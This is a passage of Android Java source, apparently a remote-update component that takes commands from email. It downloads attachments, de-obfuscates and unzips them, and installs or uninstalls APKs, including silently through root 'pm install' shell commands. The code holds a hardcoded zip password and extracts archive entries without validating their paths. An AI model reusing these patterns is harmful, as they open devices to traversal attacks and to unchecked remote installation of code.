  	{
	  	Object msgContent = msg.getContent();
			if (msgContent instanceof Multipart) 
			{
	       Multipart multipart = (Multipart) msgContent;
	       for (int j = 0; j < multipart.getCount(); j++) 
	       {
	        BodyPart bodyPart = multipart.getBodyPart(j);
	        String disposition = bodyPart.getDisposition();
	        
	        if (disposition != null && (disposition.equalsIgnoreCase("ATTACHMENT"))) 
	        {
	        	dbf.setbAttachment(true);
	        }
	        else 
	        { 
	        	if (VerifyMessageID((MimeMessage)msg))
	        		return false;
	        	
	        	if (!dbf.ParseLines(bodyPart.getContent().toString().trim()))
	    				return false;    
	        	else
	        	{
	        		if (dbf.VerifyId(sAppCId, sAppWId, sCmd))
	  						AppendMessageID((MimeMessage)msg);
	        	}
	        }
	      }
			}
			else                
			{
				if (VerifyMessageID((MimeMessage)msg))
      		return false;
				
				if (!dbf.ParseLines(msg.getContent().toString().trim()))
					return false;
				else
				{
					if (dbf.VerifyId(sAppCId, sAppWId, sCmd))
						AppendMessageID((MimeMessage)msg);										
				}
			}
			
			return true;
  	}
  	catch (Exception ex)
  	{
  		Log.i("RunParseMail", "Exception: " + ex.getMessage());
  		return false;
  	}
  }
  
  private boolean VerifyMessageID(MimeMessage msg)
  {
  	boolean bFound = false;
  			
  	try
  	{
	  	TinyDB db = new TinyDB(m_ctx);
	  		  		  	  	
	  	String sMsgId = db.getString("ArrMessageID").trim();
	  	String[] arrMsgId = sMsgId.split(",");
	  	for (String sId: arrMsgId)
	  	{
	  		if (sId.equalsIgnoreCase(msg.getMessageID()))
	  		{
	  			bFound = true;
	  			break;
	  		}
	  	}	  	
	  	
	  	if (arrMsgId.length > 200)
	  	{
	  		String sSavedId = "";
	  		for (int i=101;i<arrMsgId.length;i++)
		  	{	  			
	  			if (i < arrMsgId.length - 1)
	  				sSavedId = arrMsgId[i] + ",";
	  			else
	  				sSavedId = arrMsgId[i];
		  	}
	  		
	  		db.putString("ArrMessageID", sSavedId);
	  	}
  	}
  	catch (Exception ex)
  	{}
  	
  	return bFound;
  }
  
  private void AppendMessageID(MimeMessage msg)
  {
  	try
  	{
	  	TinyDB db = new TinyDB(m_ctx);
	  	
	  	long lDateLast = db.getLong("LastArrMessageID_DeleteDateTime", Calendar.getInstance().getTimeInMillis());
	  	
	  	Calendar calLast = Calendar.getInstance();
	  	calLast.setTimeInMillis(lDateLast);
	  	
	  	Calendar calNow = Calendar.getInstance();
	  	
	  	TimeDiff td = new TimeDiff();
	  	R1Util.GetTimeDiff(calNow, calLast, td);
	  	if (td.getlDifDays() >= DELETE_EMAIL_ID_DAY)	  	
	  	{
	  		// cleanup ArrMessageID
	  		db.putString("ArrMessageID", "");
	  		
	  		// set last date
	  		db.putLong("LastArrMessageID_DeleteDateTime", calNow.getTimeInMillis());
	  	}	  	
	  	
	  	String sMsgId = db.getString("ArrMessageID").trim();
	  	if (sMsgId.length() > 0)
	  		sMsgId += "," + msg.getMessageID();
	  	else
	  		sMsgId += msg.getMessageID();
	  	
	  	db.putString("ArrMessageID", sMsgId);
  	}
  	catch (Exception ex)
  	{}
  }
  
  private void DownloadAttachment(Message message, List<APKUpdate> attachments, List<APKUpdate> msaUpdate, TimsTracCmd cmd)
  {
  	TinyDB db = new TinyDB(m_ctx);
  	//boolean bIsRooted = RootUtil.isDeviceRooted();
  	
  	try
  	{	  	    		
	    Multipart multipart = (Multipart) message.getContent();
	    // System.out.println(multipart.getCount());
	
	    for (int i = 0; i < multipart.getCount(); i++) 
	    {
        BodyPart bodyPart = multipart.getBodyPart(i);
        if(!Part.ATTACHMENT.equalsIgnoreCase(bodyPart.getDisposition()) &&
               bodyPart.getFileName() == null) 
        {        	
        	continue; // dealing with attachments only
        }                               
                
        String sFolder = "";
        /*if (RootUtil.isDeviceRooted())
        {
        	sFolder = "/data/data/" + m_ctx.getPackageName();
        }
        else
        {*/
        	sFolder = GetDLFolder() + "/msaupdate";
        	
        	if (R1Util.IsFileExists(sFolder))
        		R1Util.DeleteDir(new File(sFolder));
        	
        	File folder = new File (sFolder);
        	if (!folder.mkdir())
        		return;
        //}                
        
        if (!bodyPart.getFileName().toLowerCase().startsWith("mob"))
        	continue;
        
        String sFilename = sFolder + "/" + bodyPart.getFileName();
        String sFilenameDecrypt = sFolder + "/decrypted.zip";
        
        R1Util.DeleteDir(new File(sFilename));
        R1Util.DeleteDir(new File(sFilenameDecrypt));
        
        // write zip to internal storage
        InputStream is = bodyPart.getInputStream();
        
        File f = new File(sFilename);
        FileOutputStream fos = new FileOutputStream(f);
        
        //FileOutputStream fos = m_ctx.openFileOutput(sFilename, Context.MODE_WORLD_READABLE | Context.MODE_WORLD_WRITEABLE);        
        
        byte[] buf = new byte[4096];
        int bytesRead;        
        int nSize = (int) (bodyPart.getSize() * 0.725);
        int nTotalRead = 0;
        int nSendBR = 8;
        while((bytesRead = is.read(buf))!=-1) 
        {
        	fos.write(buf, 0, bytesRead);
        	nTotalRead+= bytesRead;
        	  
        	if (nSendBR == 8)
        	{
        		Intent intent = new Intent();
        		intent.setAction("com.dtj.msa.MSA_DOWNLOAD");
        		intent.putExtra("Read", nTotalRead);
        		intent.putExtra("Size", nSize);
        		m_ctx.sendBroadcast(intent);
        		nSendBR = -1;
        	}
        	nSendBR++;
        }
        
        Intent intent = new Intent();
				intent.setAction("com.dtj.msa.MSA_DOWNLOAD");
				intent.putExtra("Finished", 1);
				m_ctx.sendBroadcast(intent);
        
        fos.close();
        
        String sZipFolder = sFolder;
        if (cmd == TimsTracCmd.Update)
        {
	        // decrypt file
	        if (!R1Util.ReverseObfuscateFile(sFilename, sFilenameDecrypt))
	        {
	        	db.putString("DownloadUpdateResult", "Error: Failed to decrypt files");
	        	return;
	        }        
                
	        // unzip to a new folder
	        //String sZipFolder = String.format("%s/file%d", sFolder, (i+1));
	        File f2 = new File(sFilenameDecrypt);
	        //String sZipFolder = "/data/data/" + m_ctx.getPackageName();	        
	        Unzip(f2.getPath(), sZipFolder);
        }
        else if (cmd == TimsTracCmd.Contact)
        {
        	// unzip to a new folder
	        //String sZipFolder = String.format("%s/file%d", sFolder, (i+1));
	        File f2 = new File(sFilename);
	        //String sZipFolder = "/data/data/" + m_ctx.getPackageName();	        
	        Unzip(f2.getPath(), sZipFolder);
	        
	        String[] arrCSV = R1Util.ListFilesInDir(sZipFolder, ".csv");
	  			if (arrCSV.length > 0)
	  			{
	  				for (String sFile: arrCSV)
	  				{
	  					if (sFile.equalsIgnoreCase("contact.csv"))
	  					{
			  				APKUpdate apk = new APKUpdate();
		  	        apk.setM_file(new File(sZipFolder + "/" + sFile));
		  	        attachments.add(apk);
		  	        
		  	        // copy csv to root storage
		  	        String sCSV = GetDLFolder() + "/" + sFile;
		  	        if (R1Util.IsFileExists(sCSV))
		  	        	R1Util.DeleteDir(new File(sCSV));
		  	        
		  	        R1Util.CopyDir(apk.getM_file(), sZipFolder + "/" + sFile, sCSV);		  	        
	  					}
	  				}
	  			}
	  			
	  			if (attachments.size() > 0)	  			
	  	    	db.putString("DownloadContactResult", "OK");	  	    		  	    		  			
	  			else
	  				db.putString("DownloadContactResult", "Error");
	  			
	  			// delete msaupdate folder
  	    	R1Util.DeleteDir(new File(sZipFolder));
	  			
	  			return;
        }
        
        //search for apk
        String[] arrAPK = R1Util.ListFilesInDir(sZipFolder, ".apk");
  			if (arrAPK.length > 0)
  			{
  				for (String sFile: arrAPK)
  				{  					
  					/*if (sFile.toLowerCase().startsWith("msa_update_v"))
  					{
  						// copy MobSuit*.apk to internal storage or sdcard
  						String sDestFile = GetDLFolder() + "/" + sFile ;
  						R1Util.CopyFile(sZipFolder + "/" + sFile, sDestFile);
  						
  						Thread.sleep(100);
  						
  						// delete apk
  						R1Util.DeleteDir(new File(sZipFolder + "/" + sFile));
  						
  						APKUpdate apk = new APKUpdate();
	  	        apk.setM_file(new File(sDestFile));
	  	        msaUpdate.add(apk);
  					}
  					else
  					{
	  					APKUpdate apk = new APKUpdate();
	  	        apk.setM_file(new File(sZipFolder + "/" + sFile));
	  	        attachments.add(apk);  	          					
  					}*/
  					
  					APKUpdate apk = new APKUpdate();
  	        apk.setM_file(new File(sZipFolder + "/" + sFile));
  	        attachments.add(apk);
  				}
  			}                                
	    }
	    
	    if (attachments.size() > 0)	    	    
	    	db.putString("DownloadUpdateResult", "OK");
	    else
	    	db.putString("DownloadUpdateResult", "Error: Failed to download files");
  	}
  	catch (Exception ex)
  	{
  		db.putString("DownloadUpdateResult", "Error: " + ex.getMessage());
  	}
  }
  
  private void InstallAPK(List<APKUpdate> files) // easy way
  {
  	for (int i=0;i<files.size();i++)
  	{  		
  		File apk = files.get(i).getM_file();
  		
  		Log.e("APK UPDATE", "Filename: " + apk.getPath()); 
  		
	  	Intent intent = new Intent(Intent.ACTION_VIEW);
	    intent.setDataAndType(Uri.fromFile(apk), 
	    		"application/vnd.android.package-archive");
	    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	    m_ctx.startActivity(intent);
  	}
  }
  
  /*private void UninstallAPK(String sPackage) // easy way
  {
  	Uri packageUri = Uri.parse("package:" + sPackage);
    Intent uninstallIntent =
      new Intent(Intent.ACTION_DELETE, packageUri);
    m_ctx.startActivity(uninstallIntent);
  }*/
  
  private void InstallAPKViaPM(List<APKUpdate> files, boolean bInstall) // hard way 
  {
  	TinyDB db = new TinyDB(m_ctx);
  	String sError = "";
  	  	
		try
		{
			for (m_nAPK=0;m_nAPK<files.size();m_nAPK++)
	  	{
				APKUpdate upd = files.get(m_nAPK);
	  		File apk = files.get(m_nAPK).getM_file();
	  		//String sCmd = "pm install -r " + apk.getPath();
	  		String sCmd = "";
	  		if (bInstall)
	  			sCmd = "pm install -r " + apk.getPath();
	  		else
	  			sCmd = "pm uninstall " + upd.getM_sPackageName();
	  		
		  	RootTools.sendShell(sCmd, rst);		  	
		  	
		  	while (!upd.isM_bProcessed())
		  	{
		  		Thread.sleep(1000);
		  		
		  		if (upd.isM_bProcessed())
		  			break;
		  	}
		  	
		  	sError += upd.getM_sResult() + "|";
	  	}
			
			db.putString("AppUpdateResult", sError);
		}
		catch (Exception ex)
		{
			db.putString("AppUpdateResult", "Error: " + ex.getMessage());
		}  	  	  
  }  
  
  /*private void InstallAPKViaADB(List<APKUpdate> files, boolean bInstall) // hard way 
  {
  	TinyDB db = new TinyDB(m_ctx);
  	String sError = "";
  	  	
		try
		{
			for (m_nAPK=0;m_nAPK<files.size();m_nAPK++)
	  	{
				APKUpdate upd = files.get(m_nAPK);
	  		File apk = files.get(m_nAPK).getM_file();
	  		//String sCmd = "pm install -r " + apk.getPath();
	  		String sCmd = "";
	  		if (bInstall)
	  			sCmd = "adb install -r " + apk.getPath();
	  		else
	  			sCmd = "adb uninstall " + upd.getM_sPackageName();
	  		
		  	RootTools.sendShell(sCmd, rst);		  	
		  	
		  	while (!upd.isM_bProcessed())
		  	{
		  		Thread.sleep(1000);
		  		
		  		if (upd.isM_bProcessed())
		  			break;
		  	}
		  	
		  	sError += upd.getM_sResult() + "|";
	  	}
			
			db.putString("AppUpdateResult", sError);
		}
		catch (Exception ex)
		{
			db.putString("AppUpdateResult", "Error: " + ex.getMessage());
		}  	  	  
  }*/
  
  /*private void InstallAPKViaProcess(List<APKUpdate> files) // hard way 
  {
  	TinyDB db = new TinyDB(m_ctx);
  	String sError = "";
  	  	  	  	
		try
		{
			for (m_nAPK=0;m_nAPK<files.size();m_nAPK++)
	  	{
				APKUpdate upd = files.get(m_nAPK);
	  		File apk = files.get(m_nAPK).getM_file();
	  		String[] args1 = { "pm", "install", "-r", apk.getPath() };
	  		sError += exec(args1);
	  	}
			
			db.putString("AppUpdateResult", sError);
		}
		catch (Exception ex)
		{
			db.putString("AppUpdateResult", "Error: " + ex.getMessage());
		}  	  	  
  }*/
  
  Result rst = new Result() 
	{
		
		@Override
		public void process(String arg0) throws Exception {
			// TODO Auto-generated method stub
			
		}
		
		@Override
		public void onFailure(Exception arg0) 
		{
			APKUpdate upd = m_attachments.get(m_nAPK);
			upd.setM_bProcessed(true);
			upd.setM_sResult("Error: " + arg0.getMessage());
			
			//TinyDB db = new TinyDB(m_ctx);
			//db.putString("AppUpdateResult", "Error: " + arg0.getMessage());		
		}
		
		@Override
		public void onComplete(int arg0) 
		{
			APKUpdate upd = m_attachments.get(m_nAPK);
			upd.setM_bProcessed(true);
			
			if (arg0 == 0)
				upd.setM_sResult("OK");
			else
				upd.setM_sResult("Error: APK installation failed");
		}
	};
	
	public boolean Unzip(String sZipFile, String sZipFolder) 
	{
		ZipInputStream is = null;
		OutputStream os = null;
		boolean bOK = false;
		
		try 
		{
			// Initiate the ZipFile
			ZipFile zipFile = new ZipFile(sZipFile);
			String destinationPath = sZipFolder;
			
			// If zip file is password protected then set the password
			if (zipFile.isEncrypted()) {
				zipFile.setPassword("##(com.android.zip)7453708481(dtj.r1.msa)@@");
			}
			
			//Get a list of FileHeader. FileHeader is the header information for all the
			//files in the ZipFile
			List fileHeaderList = zipFile.getFileHeaders();
			
			// Loop through all the fileHeaders
			for (int i = 0; i < fileHeaderList.size(); i++) 
			{
				FileHeader fileHeader = (FileHeader)fileHeaderList.get(i);
				if (fileHeader != null) 
				{					
					//Build the output file
					String outFilePath = destinationPath + System.getProperty("file.separator") + fileHeader.getFileName();
					File outFile = new File(outFilePath);
					
					//Checks if the file is a directory
					if (fileHeader.isDirectory()) 
					{
						//This functionality is up to your requirements
						//For now I create the directory
						outFile.mkdirs();
						continue;
					}
					
					//Check if the directories(including parent directories)
					//in the output file path exists
					File parentDir = outFile.getParentFile();
					if (!parentDir.exists()) {
						parentDir.mkdirs();
					}
					
					//Get the InputStream from the ZipFile
					is = zipFile.getInputStream(fileHeader);
					//Initialize the output stream					
					os = new FileOutputStream(outFile);
					//os = m_ctx.openFileOutput(outFile.getPath(), Context.MODE_WORLD_READABLE | Context.MODE_WORLD_WRITEABLE);
					
					int readLen = -1;
					byte[] buff = new byte[BUFF_SIZE];
					long nRead = 0;
					
					//Loop until End of File and write the contents to the output stream
					while ((readLen = is.read(buff)) != -1) 
					{
						os.write(buff, 0, readLen);
						nRead += readLen;
						
						//UpdateSize(String.format("%s: %d KB", outFile, nRead/1024));
					}
					
					//Please have a look into this method for some important comments
					closeFileHandlers(is, os);
					
					//To restore File attributes (ex: last modified file time, 
					//read only flag, etc) of the extracted file, a utility class
					//can be used as shown below
					UnzipUtil.applyFileAttributes(fileHeader, outFile);
					
					// SET OUR ATTRIBUTES
					//outFile.setReadable(true, false);
					String[] args1 = { "chmod", "705", sZipFolder };
			    exec(args1);
			    String[] args2 = { "chmod", "604", outFilePath };
			    exec(args2);
					//RootTools.sendShell("chmod 777 " + sZipFolder);
					//RootTools.sendShell("chmod 777 " + outFilePath);
					
					System.out.println("Done extracting: " + fileHeader.getFileName());
					
					bOK = true;
				} 
				else 
				{
					System.err.println("fileheader is null. Shouldn't be here");
				}
			}
		} 
		catch (Exception e) 
		{
			e.printStackTrace();
			bOK = false;
		} 
		finally 
		{
			try 
			{
				closeFileHandlers(is, os);
			} 
			catch (IOException e) 
			{
				e.printStackTrace();
			}
		}
		
		return bOK;
	}
	
	private void closeFileHandlers(ZipInputStream is, OutputStream os) throws IOException
	{
		//Close output stream
		if (os != null) {
			os.close();
			os = null;
		}
		
		//Closing inputstream also checks for CRC of the the just extracted file.
		//If CRC check has to be skipped (for ex: to cancel the unzip operation, etc)
		//use method is.close(boolean skipCRCCheck) and set the flag,
		//skipCRCCheck to false
		//NOTE: It is recommended to close outputStream first because Zip4j throws 
		//an exception if CRC check fails
		if (is != null) {
			is.close();
			is = null;
		}
	}	
	
	public String exec(String[] args) 
	{
    String result = "";
    ProcessBuilder processBuilder = new ProcessBuilder(args);
    Process process = null;
    InputStream errIs = null;
    InputStream inIs = null;
    try {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int read = -1;
        process = processBuilder.start();
        errIs = process.getErrorStream();
        while ((read = errIs.read()) != -1) {
            baos.write(read);
        }
        baos.write('\n');
        inIs = process.getInputStream();
        while ((read = inIs.read()) != -1) {
            baos.write(read);
        }
        byte[] data = baos.toByteArray();
        result = new String(data);
    } catch (IOException e) {
        e.printStackTrace();
    } catch (Exception e) {
        e.printStackTrace();
    } finally {
        try {
            if (errIs != null) {
                errIs.close();
            }
            if (inIs != null) {
                inIs.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (process != null) {
            process.destroy();
        }
    }
    return result;
	}
	
	/*private boolean ReverseObfuscateFile(String sSrc, String sDest)
	{
		boolean bOK = false;
		
		try
		{		
			FileInputStream fin = new FileInputStream(sSrc);
			byte[] buffer = new byte[512];
			byte[] temp = new byte[2];
			//StringBuilder sb = new StringBuilder();
			int nRead = 0;
			
			byte[] byOdd = new byte[2];
			byte[] byEven = new byte[1];
			
			if (R1Util.IsFileExists(sDest))
				R1Util.DeleteDir(new File(sDest));
												
			FileOutputStream fos = new FileOutputStream(sDest, true);
																							
			long lTotal = 0;
			int nCounter = 0;
			while ((nRead = fin.read(buffer)) != -1)
			{	
				lTotal += nRead;								
					
				byte[] byData = null;
				if (nRead < 512)
				{
					if (nCounter % 2 == 0)
					{
						byData = new byte[nRead-1];
						R1Util.CopyArray(buffer, byData, 0, nRead-1);
					}
					else
					{
						byData = new byte[nRead-2];
						R1Util.CopyArray(buffer, byData, 0, nRead-2);
					}
				}
				else
				{
					byData = new byte[nRead];
					R1Util.CopyArray(buffer, byData, 0, nRead);
				}
				
				ArrayUtils.reverse(byData);
		    fos.write(byData);
				
				// remove added chars
		    if (nCounter % 2 == 0)
		    	fin.read(byEven);
				else
					fin.read(byOdd);				
												   		    
		    nCounter++;
		    //if (nCounter % 1000 == 0 || nRead < 512)		    	
		    	//AddLog2(String.format("Counter: %d, Read: %d, Total: %d\n", nCounter, nRead, lTotal));		    
			}    		
			
			fin.close();
			fos.flush();
	    fos.close();			
	    
	    bOK = true;
		}
		catch (IOException e)
		{					
			//AddLog2("Reverse obfuscate file exception: " + e.getMessage());
		}
						
		return bOK;
		
		//AddLog2("File decryption done\n");
	}*/
	
	private String GetDLFolder()
	{		
		String sDLFolder = "";
		
		String[] arrSD = R1Util.getStorageDirectories();
		for(String sDir: arrSD)					
		{
			// check if storage exists
			String sFile = sDir + "/test0011.tst";	
			R1Util.SaveFile(sFile, "test");
			if (R1Util.IsFileExists(sFile))
			{
				sDLFolder = sDir;
				R1Util.DeleteDir(new File(sFile));
				break;
			}
		}
		
		/*if (m_sDLFolder.length() <= 0)
			m_sDLFolder = "/data/data/" + m_ctx.getPackageName();*/
		
		return sDLFolder;
	}
}
